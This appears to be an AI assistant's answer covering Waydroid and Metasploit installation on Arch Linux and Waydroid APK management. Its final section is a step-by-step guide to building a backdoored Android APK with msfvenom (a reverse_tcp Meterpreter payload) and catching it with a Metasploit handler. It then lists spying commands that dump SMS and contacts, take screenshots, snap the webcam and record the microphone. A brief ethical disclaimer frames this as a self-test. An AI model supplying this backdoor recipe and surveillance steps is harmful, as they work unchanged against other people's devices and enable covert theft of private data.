On **Arch Linux**, you can install **Waydroid** in **one command** using **yay** (AUR helper) or manually via `git`.  

---

### **🚀 One-Command Installation (Using yay)**
```bash
yay -S waydroid waydroid-image
```
This will:  
✅ Install **Waydroid**  
✅ Download the **Waydroid system image**  

---

### **🔹 If You Don't Have yay Installed**  
First, install `yay`:  
```bash
sudo pacman -S --needed base-devel git
git clone https://aur.archlinux.org/yay-bin.git
cd yay-bin
makepkg -si
```
Then, install Waydroid:
```bash
yay -S waydroid waydroid-image
```

---

### **🚀 Start Waydroid**
1️⃣ **Initialize Waydroid** (Download system image & set up)  
```bash
sudo waydroid init
```

2️⃣ **Start the Waydroid service**  
```bash
sudo systemctl start waydroid-container
```

3️⃣ **Launch Waydroid**  
```bash
waydroid session start
waydroid show-full-ui
```

---

### **📌 Verify Installation**
Check if Waydroid is running:  
```bash
waydroid status
```

✅ If everything is working, you can **enable Waydroid at startup**:  
```bash
sudo systemctl enable waydroid-container
```

---

### **🎯 One-Liner for Full Installation**
```bash
yay -S waydroid waydroid-image && sudo waydroid init && sudo systemctl enable --now waydroid-container && waydroid session start && waydroid show-full-ui
```

---

### **🔥 Install Metasploit on Arch Linux (One Command)**
On **Arch Linux**, you can install Metasploit easily using `yay`:  

```bash
yay -S metasploit
```
This will install **Metasploit Framework** and all required dependencies.

---

### **🚀 Start Metasploit**
Once installed, launch Metasploit by running:
```bash
msfconsole
```

---

### **📌 Optional: Enable PostgreSQL for Database Support**
Metasploit uses PostgreSQL for storing exploits and session data. To enable it:  

1️⃣ **Start PostgreSQL Service**  
```bash
sudo systemctl start postgresql
```
2️⃣ **Initialize the Database**  
```bash
sudo -u postgres initdb -D /var/lib/postgres/data
```
3️⃣ **Enable PostgreSQL at Boot**  
```bash
sudo systemctl enable postgresql
```
4️⃣ **Start Metasploit with DB Support**  
```bash
msfdb init
msfconsole
```

---

### **🎯 One-Liner for Full Setup**
```bash
yay -S metasploit && sudo systemctl start postgresql && sudo -u postgres initdb -D /var/lib/postgres/data && sudo systemctl enable postgresql && msfdb init && msfconsole
```

---
### **📌 Install & Uninstall Apps in Waydroid Using Commands**  

You can install and uninstall APKs in **Waydroid** using the `waydroid app install` and `waydroid app remove` commands.

---

## **🔥 1. Install an APK in Waydroid**  

### **✅ Method 1: Using `waydroid app install`** (Recommended)
```bash
waydroid app install /path/to/app.apk
```
Example:
```bash
waydroid app install ~/Downloads/example.apk
```

### **✅ Method 2: Using ADB**
If the `waydroid app install` command doesn't work, enable ADB and install the app manually:
1. **Enable ADB** in Waydroid:
   ```bash
   waydroid shell setprop persist.waydroid.adb.enabled 1
   ```
2. **Connect ADB** to Waydroid:
   ```bash
   adb connect 127.0.0.1:5555
   ```
3. **Install the APK**:
   ```bash
   adb install /path/to/app.apk
   ```
   Example:
   ```bash
   adb install ~/Downloads/example.apk
   ```

---

## **🗑️ 2. Uninstall an App in Waydroid**  

### **✅ Method 1: Using `waydroid app remove`** (Recommended)
```bash
waydroid app remove package.name
```
To find the package name of the app, use:
```bash
waydroid app list
```
Example:
```bash
waydroid app remove com.example.app
```

### **✅ Method 2: Using ADB**
1. **Enable ADB (if not already enabled)**:
   ```bash
   waydroid shell setprop persist.waydroid.adb.enabled 1
   adb connect 127.0.0.1:5555
   ```
2. **List all installed apps to find the package name**:
   ```bash
   adb shell pm list packages | grep appname
   ```
3. **Uninstall the app**:
   ```bash
   adb shell pm uninstall -k --user 0 package.name
   ```
   Example:
   ```bash
   adb shell pm uninstall -k --user 0 com.example.app
   ```

---

## **🚀 Summary of Commands**
| Action | Command |
|--------|---------|
| **Install APK (Waydroid)** | `waydroid app install /path/to/app.apk` |
| **Install APK (ADB)** | `adb install /path/to/app.apk` |
| **List Installed Apps** | `waydroid app list` |
| **Uninstall App (Waydroid)** | `waydroid app remove package.name` |
| **Uninstall App (ADB)** | `adb shell pm uninstall -k --user 0 package.name` |

---

### **🚨 Ethical Disclaimer**  
Hacking into systems without proper authorization is **illegal and unethical**. If you are testing security for **educational or authorized penetration testing**, ensure you have **explicit permission** before proceeding.  

I will guide you on how to **simulate** an attack on your own Waydroid instance using **Metasploit**, which can be useful for security research and red teaming.

---

## **📌 Steps to Hack Waydroid Using Metasploit**
We will create a **malicious APK payload**, install it in Waydroid, and get a **Meterpreter session**.

---

### **Step 1: Generate a Malicious APK (Payload)**
Use **msfvenom** to create an Android reverse shell payload:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=4444 -o backdoor.apk
```
- Replace `<Your_IP>` with your **local IP** (find using `ip a`).
- **Example:**  
  ```bash
  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o backdoor.apk
  ```
- This creates `backdoor.apk` in your current directory.

---

### **Step 2: Start a Metasploit Listener**
1. Open **Metasploit Framework**:
   ```bash
   msfconsole
   ```
2. Set up a multi-handler to catch the connection:
   ```bash
   use exploit/multi/handler
   set payload android/meterpreter/reverse_tcp
   set LHOST <Your_IP>
   set LPORT 4444
   exploit
   ```
   This will **listen** for incoming connections from the infected device.

---

### **Step 3: Install the Malicious APK in Waydroid**
Now, install the APK in Waydroid:

```bash
waydroid app install backdoor.apk
```
OR, if you are using **ADB**:

```bash
adb install backdoor.apk
```

---

### **Step 4: Exploit the Device**
Once the APK is installed, **open the app manually inside Waydroid**.  
- The app will connect to your Metasploit listener.  
- If successful, you will see a **Meterpreter session** in Metasploit.  

Check active sessions:
```bash
sessions -i
```
To interact with the session:
```bash
sessions -i 1
```

---

### **Step 5: Gain Control & Execute Commands**
Inside **Meterpreter**, you can:
- **Dump SMS & Contacts**:  
  ```bash
  dump_sms
  dump_contacts
  ```
- **Check system info**:  
  ```bash
  sysinfo
  ```
- **Take a screenshot**:  
  ```bash
  screenshot
  ```
- **Enable camera & mic spying (if supported)**:  
  ```bash
  webcam_snap
  record_mic 10
  ```
- **Get a root shell (if root access available)**:  
  ```bash
  shell
  ```

---

## **🔥 Summary**
| Step | Command |
|------|---------|
| **Generate APK Payload** | `msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -o backdoor.apk` |
| **Start Metasploit Listener** | `use exploit/multi/handler` → Set payload & run `exploit` |
| **Install APK in Waydroid** | `waydroid app install backdoor.apk` |
| **Get Meterpreter Access** | `sessions -i` |
| **Execute Commands** | `sysinfo`, `dump_sms`, `screenshot`, `webcam_snap`, `shell` |

---

## **🚀 Conclusion**
This is a **basic penetration testing method** to check if your Waydroid setup is vulnerable. Always ensure you are testing in a **legal & ethical environment**.

